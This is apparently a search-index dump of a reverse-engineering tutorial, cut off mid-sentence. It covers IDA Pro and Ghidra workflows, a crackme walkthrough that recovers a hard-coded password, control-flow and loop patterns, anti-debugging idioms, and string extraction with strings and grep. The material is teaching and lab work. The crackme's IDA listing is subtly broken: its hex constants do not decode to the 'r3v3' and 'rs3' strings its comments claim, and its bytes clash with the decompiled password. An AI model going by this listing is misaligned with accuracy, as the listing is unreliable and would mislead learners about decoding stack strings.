<pre><code>.text:08048350 start           proc near\n.text:08048350                 xor     ebp, ebp\n.text:08048352                 pop     esi\n.text:08048353                 mov     esp, ecx\n.text:08048355                 and     esp, 0FFFFFFF0h\n.text:08048358                 push    eax\n.text:08048359                 push    esp\n.text:0804835A                 push    edx\n.text:0804835B                 push    offset __libc_csu_fini\n.text:08048360                 push    offset __libc_csu_init\n.text:08048365                 push    ecx\n.text:08048366                 push    esi\n.text:08048367                 push    offset main\n.text:0804836C                 call    __libc_start_main\n</code></pre></p> <p>Main Function Analysis: <pre><code>.text:080483ED main            proc near\n.text:080483ED\n.text:080483ED password        = byte ptr -6Ch\n.text:080483ED\n.text:080483ED                 push    ebp\n.text:080483EE                 mov     ebp, esp\n.text:080483F0                 and     esp, 0FFFFFFF0h\n.text:080483F3                 sub     esp, 70h\n.text:080483F6                 mov     dword ptr [esp], offset aEnterPassword ; \"Enter password: \"\n.text:080483FD                 call    printf\n.text:08048402                 mov     eax, offset aS     ; \"%99s\"\n.text:08048407                 lea     edx, [esp+70h+password]\n.text:0804840B                 mov     [esp+4], edx\n.text:0804840F                 mov     [esp], eax\n.text:08048412                 call    scanf\n.text:08048417                 lea     eax, [esp+70h+password]\n.text:0804841B                 mov     [esp], eax\n.text:0804841E                 call    check_password\n</code></pre></p> <p>check_password Function: <pre><code>.text:080483C4 check_password  proc near\n.text:080483C4\n.text:080483C4 secret          = byte ptr -10h\n.text:080483C4 input           = dword ptr  8\n.text:080483C4\n.text:080483C4                 push    ebp\n.text:080483C5                 mov     ebp, esp\n.text:080483C7                 sub     esp, 18h\n.text:080483CA                 mov     dword ptr [ebp+secret], 72337233h    ; \"r3v3\"\n.text:080483D1                 mov     dword ptr [ebp+secret+4], 72337672h  ; \"rs3\"\n.text:080483D8                 mov     byte ptr [ebp+secret+7], 0\n.text:080483DC                 mov     eax, [ebp+input]\n.text:080483DF                 lea     edx, [ebp+secret]\n.text:080483E2                 mov     [esp+4], edx\n.text:080483E6                 mov     [esp], eax\n.text:080483E9                 call    strcmp\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#ida-pro-analysis-techniques","title":"IDA Pro Analysis Techniques","text":"<p>1. Renaming Functions: <pre><code>Right-click function \u2192 Rename\nF2 key to rename symbols\n</code></pre></p> <p>2. Adding Comments: <pre><code>; or : key to add comments\nRepeatable comments with Shift+;\n</code></pre></p> <p>3. Creating Structures: <pre><code>Structures view \u2192 Insert \u2192 Create structure\nDefine members and types\nApply to data in disassembly\n</code></pre></p> <p>4. Cross-References: <pre><code>Ctrl+X to show cross-references\nNavigate between calls and references\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#ghidra-analysis","title":"Ghidra Analysis","text":""},{"location":"reverse-engineering/static/01-disassemblers/#loading-and-analysis","title":"Loading and Analysis","text":"<ol> <li> <p>Create Project: <pre><code>File \u2192 New Project \u2192 Non-Shared Project\nProject Name: \"CrackMe Analysis\"\n</code></pre></p> </li> <li> <p>Import Binary: <pre><code>File \u2192 Import File \u2192 Select crackme\nFormat: Executable and Linking Format (ELF)\nLanguage: x86:LE:32:default\n</code></pre></p> </li> <li> <p>Auto Analysis: <pre><code>Analysis \u2192 Auto Analyze\nEnable all analyzers\nClick \"Analyze\"\n</code></pre></p> </li> </ol>"},{"location":"reverse-engineering/static/01-disassemblers/#decompiler-view","title":"Decompiler View","text":"<p>Main Function Decompiled: <pre><code>undefined4 main(void)\n{\n  int iVar1;\n  char local_6c [100];\n\n  printf(\"Enter password: \");\n  __isoc99_scanf(\"%99s\",local_6c);\n  iVar1 = check_password(local_6c);\n  if (iVar1 == 0) {\n    puts(\"Access denied!\");\n  }\n  else {\n    puts(\"Access granted!\");\n  }\n  return 0;\n}\n</code></pre></p> <p>check_password Function Decompiled: <pre><code>undefined4 check_password(char *param_1)\n{\n  int iVar1;\n  char local_10 [8];\n\n  strcpy(local_10,\"r3v3rs3\");\n  iVar1 = strcmp(param_1,local_10);\n  return (uint)(iVar1 == 0);\n}\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#ghidra-analysis-techniques","title":"Ghidra Analysis Techniques","text":"<p>1. Improving Function Signatures: <pre><code>Right-click function \u2192 Edit Function Signature\nChange return types and parameter names\n</code></pre></p> <p>2. Retyping Variables: <pre><code>Right-click variable \u2192 Retype Variable\nChoose appropriate data type\n</code></pre></p> <p>3. Creating Data Types: <pre><code>Data Type Manager \u2192 Create new types\nDefine structures and enums\n</code></pre></p> <p>4. Bookmarking: <pre><code>Right-click \u2192 Bookmark\nAdd notes and categories\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#advanced-analysis-techniques","title":"Advanced Analysis Techniques","text":""},{"location":"reverse-engineering/static/01-disassemblers/#string-analysis","title":"String Analysis","text":"<p>Finding Strings in IDA: <pre><code>View \u2192 Open subviews \u2192 Strings\nShift+F12 to open strings window\nFilter by string content or encoding\n</code></pre></p> <p>Finding Strings in Ghidra: <pre><code>Search \u2192 For Strings\nConfigure minimum length and encoding\nNavigate to string references\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#cross-reference-analysis","title":"Cross-Reference Analysis","text":"<p>Function Call Graph (IDA): <pre><code>View \u2192 Graphs \u2192 Function Calls\nVisualize function relationships\nIdentify critical paths\n</code></pre></p> <p>Function Call Trees (Ghidra): <pre><code>Window \u2192 Function Call Trees\nShow incoming and outgoing calls\nAnalyze call depth and complexity\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#data-flow-analysis","title":"Data Flow Analysis","text":"<p>Tracking Variable Usage: <pre><code>IDA: Alt+T for operand types\nGhidra: Right-click \u2192 References \u2192 Show References to\n</code></pre></p> <p>Identifying Constants and Magic Numbers: <pre><code>Look for immediate values in assembly\nCheck for hardcoded strings or numbers\nIdentify cryptographic constants\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#scripting-and-automation","title":"Scripting and Automation","text":""},{"location":"reverse-engineering/static/01-disassemblers/#idapython-example","title":"IDAPython Example","text":"<pre><code># find_strings.py - Find specific string patterns\nimport idautils\nimport idc\n\ndef find_string_patterns():\n    \"\"\"Find strings matching specific patterns\"\"\"\n    patterns = [\"password\", \"key\", \"secret\", \"admin\"]\n\n    # Iterate through all strings\n    for string_ea in idautils.Strings():\n        string_val = str(string_ea)\n\n        for pattern in patterns:\n            if pattern.lower() in string_val.lower():\n                print(f\"Found: {string_val} at {hex(string_ea.ea)}\")\n\n                # Find cross-references to this string\n                for ref in idautils.DataRefsTo(string_ea.ea):\n                    func_name = idc.get_func_name(ref)\n                    print(f\"  Referenced in: {func_name} at {hex(ref)}\")\n\nfind_string_patterns()\n</code></pre>"},{"location":"reverse-engineering/static/01-disassemblers/#ghidra-script-example","title":"Ghidra Script Example","text":"<pre><code>// FindCrypto.java - Find potential cryptographic constants\nimport ghidra.app.script.GhidraScript;\nimport ghidra.program.model.listing.*;\nimport ghidra.program.model.scalar.Scalar;\n\npublic class FindCrypto extends GhidraScript {\n\n    // Common crypto constants\n    private long[] cryptoConstants = {\n        0x67452301L,  // MD5\n        0xEFCDAB89L,  // MD5\n        0x98BADCFEL,  // MD5\n        0x10325476L,  // MD5\n        0x5A827999L,  // SHA-1\n        0x6ED9EBA1L,  // SHA-1\n    };\n\n    @Override\n    protected void run() throws Exception {\n        Listing listing = currentProgram.getListing();\n\n        // Search through all instructions\n        InstructionIterator iter = listing.getInstructions(true);\n        while (iter.hasNext()) {\n            Instruction instr = iter.next();\n\n            // Check operands for crypto constants\n            for (int i = 0; i &lt; instr.getNumOperands(); i++) {\n                Object[] opObjects = instr.getOpObjects(i);\n\n                for (Object obj : opObjects) {\n                    if (obj instanceof Scalar) {\n                        long value = ((Scalar) obj).getUnsignedValue();\n\n                        for (long constant : cryptoConstants) {\n                            if (value == constant) {\n                                printf(\"Crypto constant found: 0x%x at %s\\n\", \n                                       value, instr.getAddress());\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"reverse-engineering/static/01-disassemblers/#best-practices","title":"Best Practices","text":""},{"location":"reverse-engineering/static/01-disassemblers/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Initial Reconnaissance</li> <li>Check file type and format</li> <li>Identify packing or obfuscation</li> <li> <p>Look for obvious strings and imports</p> </li> <li> <p>Function Identification</p> </li> <li>Start with main() or entry point</li> <li>Identify library functions vs custom code</li> <li> <p>Map out high-level program flow</p> </li> <li> <p>Detailed Analysis</p> </li> <li>Analyze critical functions first</li> <li>Document findings with comments</li> <li> <p>Create meaningful symbol names</p> </li> <li> <p>Documentation</p> </li> <li>Maintain analysis notes</li> <li>Document discovered algorithms</li> <li>Create function summaries</li> </ol>"},{"location":"reverse-engineering/static/01-disassemblers/#naming-conventions","title":"Naming Conventions","text":"<pre><code>Functions:\n- check_password()\n- decrypt_data()\n- validate_license()\n\nVariables:\n- user_input\n- decryption_key\n- file_buffer\n\nLabels:\n- error_exit\n- main_loop\n- decrypt_success\n</code></pre>"},{"location":"reverse-engineering/static/01-disassemblers/#common-patterns-to-recognize","title":"Common Patterns to Recognize","text":"<p>Anti-Analysis Techniques: <pre><code>; Anti-debugging\ncall    IsDebuggerPresent\ntest    eax, eax\njnz     exit_program\n\n; Timing checks\nrdtsc                    ; Read time stamp counter\n; ... some operations\nrdtsc                    ; Read again\n; Compare difference\n</code></pre></p> <p>String Obfuscation: <pre><code>; XOR obfuscation\nmov     al, [esi]        ; Load encrypted byte\nxor     al, 42h          ; XOR with key\nmov     [edi], al        ; Store decrypted byte\ninc     esi\ninc     edi\nloop    decrypt_loop\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#tool-comparison","title":"Tool Comparison","text":"Feature IDA Pro Ghidra Cost Expensive Free Decompiler Separate license Included User Interface More polished Functional Scripting IDAPython, IDC Java, Python Collaboration Team features Built-in File Format Support Extensive Good Plugin Ecosystem Large Growing"},{"location":"reverse-engineering/static/01-disassemblers/#key-takeaways","title":"Key Takeaways","text":"<p>Disassembler Fundamentals</p> <ul> <li>Choose the right tool for your needs and budget</li> <li>Start with automatic analysis then refine manually</li> <li>Use meaningful names for functions and variables</li> <li>Document your findings with comments and notes</li> <li>Learn scripting to automate repetitive tasks</li> </ul> <p>Analysis Efficiency</p> <ul> <li>Begin with high-level overview before diving into details</li> <li>Focus on critical functions first (main, authentication, crypto)</li> <li>Use cross-references to understand data flow</li> <li>Leverage decompiler output but verify with assembly</li> <li>Practice pattern recognition for common constructs</li> </ul> <p>Common Pitfalls</p> <ul> <li>Don't trust decompiler output blindly</li> <li>Be aware of compiler optimizations affecting analysis</li> <li>Watch for anti-analysis and obfuscation techniques</li> <li>Consider multiple architectures and calling conventions</li> <li>Maintain organized analysis notes and backups</li> </ul> <p>Next: Control Flow &amp; Function Analysis</p>"},{"location":"reverse-engineering/static/02-control-flow/","title":"Control Flow &amp; Function Analysis","text":"<p>Control flow analysis is fundamental to understanding how a program executes. This section covers techniques for analyzing function structures, call graphs, and execution paths using static analysis tools.</p>"},{"location":"reverse-engineering/static/02-control-flow/#understanding-control-flow","title":"Understanding Control Flow","text":""},{"location":"reverse-engineering/static/02-control-flow/#what-is-control-flow","title":"What is Control Flow?","text":"<p>Control flow represents the order in which program instructions are executed:</p> <ul> <li>Sequential execution - Instructions executed one after another</li> <li>Conditional branches - Execution paths based on conditions</li> <li>Loops - Repeated execution of code blocks</li> <li>Function calls - Transfer control to subroutines</li> <li>Exception handling - Alternative execution paths for errors</li> </ul>"},{"location":"reverse-engineering/static/02-control-flow/#control-flow-graph-cfg","title":"Control Flow Graph (CFG)","text":"<pre><code>Example CFG:\n    [Entry]\n       |\n   [Condition]\n    /       \\\n[True]    [False]\n   |         |\n[Action A] [Action B]\n    \\       /\n    [Merge]\n       |\n    [Exit]\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-identification","title":"Function Identification","text":""},{"location":"reverse-engineering/static/02-control-flow/#function-prologue-patterns","title":"Function Prologue Patterns","text":"<p>Most functions follow predictable patterns for setup and cleanup:</p>"},{"location":"reverse-engineering/static/02-control-flow/#x86-64-function-prologue","title":"x86-64 Function Prologue","text":"<pre><code>; Standard prologue\npush    rbp          ; Save old frame pointer\nmov     rbp, rsp     ; Set new frame pointer\nsub     rsp, 0x20    ; Allocate stack space for locals\n\n; Alternative prologue (optimized)\npush    rbp\nmov     rbp, rsp\nand     rsp, 0xFFFFFFF0  ; Stack alignment\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#x86-32-function-prologue","title":"x86-32 Function Prologue","text":"<pre><code>; Standard 32-bit prologue\npush    ebp\nmov     ebp, esp\nsub     esp, 0x10    ; Allocate locals\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-epilogue-patterns","title":"Function Epilogue Patterns","text":"<pre><code>; Standard epilogue\nmov     rsp, rbp     ; Restore stack pointer\npop     rbp          ; Restore frame pointer\nret                  ; Return to caller\n\n; Simplified epilogue\nleave               ; Equivalent to mov rsp, rbp; pop rbp\nret\n\n; Alternative cleanup\nadd     rsp, 0x20   ; Deallocate locals\npop     rbp\nret\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-recognition-in-ida-pro","title":"Function Recognition in IDA Pro","text":""},{"location":"reverse-engineering/static/02-control-flow/#automatic-function-detection","title":"Automatic Function Detection","text":"<pre><code>IDA Pro automatically identifies functions by:\n1. Recognizing standard prologues/epilogues\n2. Following call instructions\n3. Analyzing cross-references\n4. Detecting code vs data patterns\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#manual-function-creation","title":"Manual Function Creation","text":"<pre><code>Creating functions manually:\n1. Position cursor at function start\n2. Press 'P' to create function\n3. Or Edit \u2192 Functions \u2192 Create Function\n4. Adjust function boundaries if needed\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-analysis-window","title":"Function Analysis Window","text":"<pre><code>Functions Window (Shift+F3):\n- Lists all identified functions\n- Shows function addresses and names\n- Allows navigation and renaming\n- Displays function statistics\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-recognition-in-ghidra","title":"Function Recognition in Ghidra","text":""},{"location":"reverse-engineering/static/02-control-flow/#function-manager","title":"Function Manager","text":"<pre><code>Window \u2192 Function Manager:\n- Shows all detected functions\n- Provides function signatures\n- Allows bulk operations\n- Displays calling conventions\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#creating-functions","title":"Creating Functions","text":"<pre><code>Manual function creation:\n1. Right-click at function start\n2. Select \"Create Function\"\n3. Or press 'F' hotkey\n4. Adjust parameters if needed\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#call-graph-analysis","title":"Call Graph Analysis","text":""},{"location":"reverse-engineering/static/02-control-flow/#understanding-call-relationships","title":"Understanding Call Relationships","text":"<pre><code>// Example program structure\nint helper_function(int x) {\n    return x * 2;\n}\n\nint process_data(int data) {\n    int result = helper_function(data);\n    return result + 10;\n}\n\nint main() {\n    int value = 42;\n    int processed = process_data(value);\n    printf(\"Result: %d\\n\", processed);\n    return 0;\n}\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#call-graph-visualization","title":"Call Graph Visualization","text":""},{"location":"reverse-engineering/static/02-control-flow/#ida-pro-call-graph","title":"IDA Pro Call Graph","text":"<pre><code>View \u2192 Graphs \u2192 Function Calls:\n- Shows function relationships\n- Identifies recursive calls\n- Highlights critical paths\n- Supports filtering and navigation\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#ghidra-function-call-trees","title":"Ghidra Function Call Trees","text":"<pre><code>Window \u2192 Function Call Trees:\n- Incoming calls (who calls this function)\n- Outgoing calls (what this function calls)\n- Call depth analysis\n- Recursive relationship detection\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#practical-call-graph-analysis","title":"Practical Call Graph Analysis","text":"<pre><code>; Example assembly showing call relationships\nmain:\n    push    rbp\n    mov     rbp, rsp\n    sub     rsp, 0x10\n\n    mov     edi, 42          ; Parameter for process_data\n    call    process_data     ; Call to process_data\n\n    mov     esi, eax         ; Result as parameter\n    lea     rdi, format_str  ; \"Result: %d\\n\"\n    call    printf           ; Call to printf\n\n    xor     eax, eax         ; Return 0\n    leave\n    ret\n\nprocess_data:\n    push    rbp\n    mov     rbp, rsp\n    sub     rsp, 0x10\n\n    mov     [rbp-4], edi     ; Store parameter\n    mov     edi, [rbp-4]     ; Load parameter\n    call    helper_function  ; Call to helper_function\n\n    add     eax, 10          ; Add 10 to result\n    leave\n    ret\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#control-flow-analysis-techniques","title":"Control Flow Analysis Techniques","text":""},{"location":"reverse-engineering/static/02-control-flow/#basic-block-identification","title":"Basic Block Identification","text":"<p>Basic blocks are sequences of instructions with: - Single entry point (first instruction) - Single exit point (last instruction) - No internal jumps or branches</p> <pre><code>; Basic Block Example\nbasic_block_1:\n    mov     eax, [rbp-4]    ; Entry point\n    add     eax, 10\n    mov     [rbp-8], eax\n    cmp     eax, 100        ; Exit point - conditional branch\n    jle     basic_block_2\n\nbasic_block_2:\n    mov     eax, [rbp-8]    ; Entry point\n    imul    eax, 2\n    mov     [rbp-4], eax    ; Exit point - unconditional jump\n    jmp     basic_block_3\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#loop-detection","title":"Loop Detection","text":""},{"location":"reverse-engineering/static/02-control-flow/#common-loop-patterns","title":"Common Loop Patterns","text":"<pre><code>; For loop pattern\n    mov     ecx, 0          ; Initialize counter\nfor_loop:\n    cmp     ecx, 10         ; Check condition\n    jge     loop_end        ; Exit if done\n\n    ; Loop body\n    call    process_item\n\n    inc     ecx             ; Increment counter\n    jmp     for_loop        ; Back to condition\nloop_end:\n\n; While loop pattern\nwhile_loop:\n    cmp     eax, 0          ; Check condition\n    je      while_end       ; Exit if condition false\n\n    ; Loop body\n    call    process_data\n    dec     eax             ; Modify condition variable\n\n    jmp     while_loop      ; Back to condition check\nwhile_end:\n\n; Do-while loop pattern\ndo_while_start:\n    ; Loop body (executes at least once)\n    call    process_data\n\n    cmp     eax, 0          ; Check condition\n    jne     do_while_start  ; Continue if condition true\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#conditional-analysis","title":"Conditional Analysis","text":""},{"location":"reverse-engineering/static/02-control-flow/#branch-prediction-and-analysis","title":"Branch Prediction and Analysis","text":"<pre><code>; Simple if-else\n    cmp     eax, 10\n    jle     else_branch     ; Jump if eax &lt;= 10\n\nif_branch:\n    mov     ebx, 100\n    jmp     after_if\n\nelse_branch:\n    mov     ebx, 200\n\nafter_if:\n    ; Continue execution\n\n; Switch statement pattern\n    cmp     eax, 0\n    je      case_0\n    cmp     eax, 1\n    je      case_1\n    cmp     eax, 2\n    je      case_2\n    jmp     default_case\n\ncase_0:\n    call    handle_case_0\n    jmp     switch_end\ncase_1:\n    call    handle_case_1\n    jmp     switch_end\ncase_2:\n    call    handle_case_2\n    jmp     switch_end\ndefault_case:\n    call    handle_default\nswitch_end:\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#advanced-control-flow-analysis","title":"Advanced Control Flow Analysis","text":""},{"location":"reverse-engineering/static/02-control-flow/#jump-tables","title":"Jump Tables","text":"<pre><code>; Jump table implementation\nswitch_handler:\n    cmp     eax, 3          ; Check bounds\n    ja      default_case    ; Out of bounds\n\n    lea     rbx, [rip + jump_table]\n    mov     rax, [rbx + rax*8]  ; Get target address\n    jmp     rax             ; Jump to handler\n\njump_table:\n    dq      case_0          ; Case 0 handler\n    dq      case_1          ; Case 1 handler\n    dq      case_2          ; Case 2 handler\n    dq      case_3          ; Case 3 handler\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#indirect-calls-and-virtual-functions","title":"Indirect Calls and Virtual Functions","text":"<pre><code>; Virtual function call (C++)\n    mov     rax, [rbp-8]    ; Load object pointer\n    mov     rax, [rax]      ; Load vtable pointer\n    mov     rax, [rax+16]   ; Load function pointer (offset 16)\n    call    rax             ; Indirect call\n\n; Function pointer call\n    mov     rax, [rbp-16]   ; Load function pointer\n    mov     edi, 42         ; Set parameter\n    call    rax             ; Indirect call\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#exception-handling","title":"Exception Handling","text":"<pre><code>; Exception handling (simplified)\ntry_block:\n    call    risky_function\n    jmp     no_exception\n\nexception_handler:\n    ; Handle exception\n    call    cleanup_function\n    jmp     after_try\n\nno_exception:\n    ; Normal execution path\n\nafter_try:\n    ; Continue execution\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#practical-analysis-examples","title":"Practical Analysis Examples","text":""},{"location":"reverse-engineering/static/02-control-flow/#example-1-recursive-function-analysis","title":"Example 1: Recursive Function Analysis","text":"<pre><code>// Factorial function\nint factorial(int n) {\n    if (n &lt;= 1) {\n        return 1;\n    }\n    return n * factorial(n - 1);\n}\n</code></pre> <p>Assembly Analysis: <pre><code>factorial:\n    push    rbp\n    mov     rbp, rsp\n    sub     rsp, 0x10\n    mov     [rbp-4], edi    ; Store parameter n\n\n    cmp     dword [rbp-4], 1  ; Compare n with 1\n    jg      recursive_case    ; If n &gt; 1, go to recursive case\n\nbase_case:\n    mov     eax, 1          ; Return 1\n    jmp     function_end\n\nrecursive_case:\n    mov     eax, [rbp-4]    ; Load n\n    sub     eax, 1          ; n - 1\n    mov     edi, eax        ; Parameter for recursive call\n    call    factorial       ; Recursive call\n\n    mov     edx, [rbp-4]    ; Load original n\n    imul    eax, edx        ; n * factorial(n-1)\n\nfunction_end:\n    leave\n    ret\n</code></pre></p>"},{"location":"reverse-engineering/static/02-control-flow/#example-2-state-machine-analysis","title":"Example 2: State Machine Analysis","text":"<pre><code>// Simple state machine\nenum State { STATE_INIT, STATE_PROCESSING, STATE_DONE };\n\nvoid state_machine(int input) {\n    static enum State current_state = STATE_INIT;\n\n    switch (current_state) {\n        case STATE_INIT:\n            if (input &gt; 0) {\n                current_state = STATE_PROCESSING;\n                start_processing();\n            }\n            break;\n\n        case STATE_PROCESSING:\n            if (input == 0) {\n                current_state = STATE_DONE;\n                finish_processing();\n            } else {\n                continue_processing(input);\n            }\n            break;\n\n        case STATE_DONE:\n            reset_system();\n            current_state = STATE_INIT;\n            break;\n    }\n}\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#ida-pro-advanced-features","title":"IDA Pro Advanced Features","text":""},{"location":"reverse-engineering/static/02-control-flow/#flow-chart-generation","title":"Flow Chart Generation","text":"<pre><code>View \u2192 Graphs \u2192 Flow chart:\n- Visual representation of control flow\n- Shows basic blocks and connections\n- Supports zooming and navigation\n- Helps understand complex functions\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#cross-references","title":"Cross-References","text":"<pre><code>Ctrl+X - Show cross-references:\n- Shows where function is called from\n- Lists data references\n- Identifies code references\n- Helps trace execution paths\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-comparison","title":"Function Comparison","text":"<pre><code>IDA Pro function comparison:\n1. Load two similar binaries\n2. Use BinDiff plugin\n3. Compare function structures\n4. Identify changes and similarities\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#ghidra-advanced-features","title":"Ghidra Advanced Features","text":""},{"location":"reverse-engineering/static/02-control-flow/#decompiler-integration","title":"Decompiler Integration","text":"<pre><code>Ghidra's decompiler shows:\n- High-level control flow\n- Reconstructed if/else statements\n- Loop structures\n- Function calls with parameters\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#script-based-analysis","title":"Script-based Analysis","text":"<pre><code>// Ghidra script to analyze control flow\nimport ghidra.app.script.GhidraScript;\nimport ghidra.program.model.listing.*;\nimport ghidra.program.model.symbol.*;\n\npublic class AnalyzeControlFlow extends GhidraScript {\n    @Override\n    public void run() throws Exception {\n        FunctionManager funcMgr = currentProgram.getFunctionManager();\n\n        for (Function func : funcMgr.getFunctions(true)) {\n            printf(\"Function: %s at %s\\n\", \n                   func.getName(), func.getEntryPoint());\n\n            // Analyze function calls\n            Set&lt;Function&gt; calledFunctions = func.getCalledFunctions(null);\n            for (Function called : calledFunctions) {\n                printf(\"  Calls: %s\\n\", called.getName());\n            }\n\n            // Analyze calling functions\n            Set&lt;Function&gt; callingFunctions = func.getCallingFunctions(null);\n            for (Function calling : callingFunctions) {\n                printf(\"  Called by: %s\\n\", calling.getName());\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#automated-analysis-tools","title":"Automated Analysis Tools","text":""},{"location":"reverse-engineering/static/02-control-flow/#angr-control-flow-analysis","title":"angr Control Flow Analysis","text":"<pre><code>import angr\n\n# Load binary\nproject = angr.Project('./binary', auto_load_libs=False)\n\n# Get control flow graph\ncfg = project.analyses.CFGFast()\n\n# Analyze function\nmain_func = cfg.functions['main']\nprint(f\"Function: {main_func.name}\")\nprint(f\"Basic blocks: {len(main_func.blocks)}\")\n\n# Show call graph\nfor func_addr in cfg.functions:\n    func = cfg.functions[func_addr]\n    print(f\"Function {func.name}:\")\n    for predecessor in func.predecessors:\n        print(f\"  Called by: {predecessor.name}\")\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#radare2-analysis","title":"Radare2 Analysis","text":"<pre><code># Load binary\nr2 ./binary\n\n# Analyze all functions\naaa\n\n# Show function list\nafl\n\n# Show call graph\nagC\n\n# Analyze specific function\npdf @ main\n\n# Show cross-references\naxt @ sym.main\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#best-practices","title":"Best Practices","text":""},{"location":"reverse-engineering/static/02-control-flow/#control-flow-documentation","title":"Control Flow Documentation","text":"<pre><code>1. Start with main function\n2. Identify key functions first\n3. Map out call relationships\n4. Document loop structures\n5. Note exception handling paths\n6. Track data flow between functions\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#function-naming-conventions","title":"Function Naming Conventions","text":"<pre><code>Naming suggestions:\n- Use descriptive names: parse_config vs sub_401000\n- Indicate purpose: validate_input, process_data\n- Show relationships: init_parser, cleanup_parser\n- Mark important functions: crypto_encrypt, auth_check\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#analysis-workflow","title":"Analysis Workflow","text":"<pre><code>1. Automatic analysis first\n2. Review function boundaries\n3. Create call graph\n4. Identify main execution paths\n5. Analyze loop structures\n6. Document findings\n7. Cross-reference with dynamic analysis\n</code></pre>"},{"location":"reverse-engineering/static/02-control-flow/#key-takeaways","title":"Key Takeaways","text":"<p>Control Flow Fundamentals</p> <ul> <li>Function identification relies on prologue/epilogue patterns</li> <li>Call graphs show program structure and relationships</li> <li>Basic blocks are fundamental units of control flow</li> <li>Loop detection helps understand program logic</li> <li>Indirect calls require special analysis techniques</li> </ul> <p>Analysis Strategy</p> <ul> <li>Start with automatic analysis tools</li> <li>Use visual representations (flowcharts, call graphs)</li> <li>Document findings with meaningful names</li> <li>Combine static and dynamic analysis</li> <li>Practice recognizing common patterns</li> </ul> <p>Common Challenges</p> <ul> <li>Optimized code may have non-standard patterns</li> <li>Indirect calls and jump tables complicate analysis</li> <li>Exception handling creates complex control flows</li> <li>Obfuscation can hide true control flow</li> <li>Large binaries require systematic approach</li> </ul> <p>Next: String &amp; Symbol Analysis</p>"},{"location":"reverse-engineering/static/03-strings-symbols/","title":"String &amp; Symbol Analysis","text":"<p>String and symbol analysis are fundamental techniques in reverse engineering that provide crucial insights into program functionality, user interfaces, error messages, and internal structure.</p>"},{"location":"reverse-engineering/static/03-strings-symbols/#string-analysis-fundamentals","title":"String Analysis Fundamentals","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#types-of-strings-in-binaries","title":"Types of Strings in Binaries","text":"<pre><code>// String examples in C\nchar global_string[] = \"Global string in .data\";\nconst char *const_string = \"Constant string in .rodata\";\nstatic char static_string[] = \"Static string\";\n\nvoid function() {\n    char local_string[] = \"Local string on stack\";\n    char *dynamic_string = malloc(50);\n    strcpy(dynamic_string, \"Dynamic string on heap\");\n}\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#string-storage-locations","title":"String Storage Locations","text":"Section Description Characteristics .rodata Read-only data Constant strings, immutable .data Initialized data Global/static strings, writable .bss Uninitialized data Buffers for runtime strings Stack Local variables Temporary strings Heap Dynamic allocation Runtime-created strings"},{"location":"reverse-engineering/static/03-strings-symbols/#finding-strings-with-tools","title":"Finding Strings with Tools","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#using-strings-command","title":"Using <code>strings</code> Command","text":"<pre><code># Basic string extraction\nstrings binary_file\n\n# Minimum length filter\nstrings -n 10 binary_file\n\n# Show offset addresses\nstrings -o binary_file\n\n# Different encodings\nstrings -e l binary_file    # 16-bit little endian\nstrings -e b binary_file    # 16-bit big endian\nstrings -e L binary_file    # 32-bit little endian\n\n# Target specific sections\nstrings -t x binary_file    # Show hex offsets\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#advanced-string-analysis","title":"Advanced String Analysis","text":"<pre><code># Find strings with context\nstrings -a -t x binary_file | grep -i \"password\\|secret\\|key\"\n\n# Extract from specific file sections\nobjdump -s -j .rodata binary_file | strings\n\n# Unicode string detection\nstrings -e l binary_file | grep -v \"^.$\"\n\n# Find embedded URLs and paths\nstrings binary_file | grep -E \"(http|ftp|file)://|[A-Za-z]:\\\\\\\\\"\n\n# Database connection strings\nstrings binary_file | grep -i \"server\\|database\\|connection\"\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#string-analysis-in-disassemblers","title":"String Analysis in Disassemblers","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#ida-pro-string-analysis","title":"IDA Pro String Analysis","text":"<pre><code>Strings Window (Shift+F12):\n- View all strings in binary\n- Filter by type and encoding\n- Show cross-references\n- Navigate to string usage\n\nString Search:\n- 